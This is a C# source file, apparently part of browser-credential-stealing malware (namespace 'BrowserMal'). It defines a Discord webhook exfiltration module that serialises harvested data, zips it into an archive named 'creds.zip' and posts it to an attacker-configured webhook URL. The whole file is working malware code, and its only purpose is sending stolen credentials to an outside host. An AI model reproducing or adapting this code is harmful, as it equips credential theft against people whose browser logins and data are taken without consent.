using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Text;

namespace BrowserMal.Discord
{
    internal class Webhook
    {
        private static readonly string url = Environment.GetEnvironmentVariable("DISCORD_WEBHOOK", EnvironmentVariableTarget.User);
        public static void SendFile<T>(List<T> list, string filename)
        {
            using (HttpClient httpClient = new HttpClient())
            {
                string json = JsonConvert.SerializeObject(list, Formatting.Indented);
                var file_bytes = Encoding.UTF8.GetBytes(json);

                MultipartFormDataContent form = new MultipartFormDataContent
                {
                    { new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", filename }
                };

                httpClient.PostAsync(url, form).Wait();
                httpClient.Dispose();
            }
        }

        public static void SendFile(byte[] file)
        {
            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent form = new MultipartFormDataContent
                {
                    { new ByteArrayContent(file, 0, file.Length), "Document", "creds.zip" }
                };

                httpClient.PostAsync(url, form).Wait();
                httpClient.Dispose();
            }
        }

        public static void BulkSend(Dictionary<string, string> files)
        {
            byte[] zipFile = ZipArchives(files);
            SendFile(zipFile);
        }

        private static byte[] ZipArchives(Dictionary<string, string> fileContents)
        {
            using (var memoryStream = new MemoryStream())
            {
                using (var zipArchive = new ZipArchive(memoryStream, ZipArchiveMode.Create, false))
                {
                    foreach (var file in fileContents)
                    {
                        ZipArchiveEntry zipE = zipArchive.CreateEntry(file.Key);

                        using (var originalFileStream = new MemoryStream(Encoding.UTF8.GetBytes(file.Value)))
                        {
                            using (var zipEntryStream = zipE.Open())
                            {
                                originalFileStream.CopyTo(zipEntryStream);
                            }
                        }
                    }
                }
                return memoryStream.ToArray();
            }
        }

    }
}
